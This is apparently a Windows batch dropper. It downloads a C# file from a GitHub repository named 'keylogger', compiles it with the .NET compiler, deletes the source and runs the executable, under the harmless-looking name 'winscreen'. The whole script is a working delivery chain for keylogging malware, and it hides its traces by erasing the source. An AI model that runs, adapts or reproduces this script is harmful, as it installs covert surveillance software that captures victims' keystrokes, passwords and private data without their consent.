@echo off
curl -O https://raw.githubusercontent.com/w3irdguy/keylogger/main/winscreen.cs
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe winscreen.cs
erase winscreen.cs & winscreen.exe
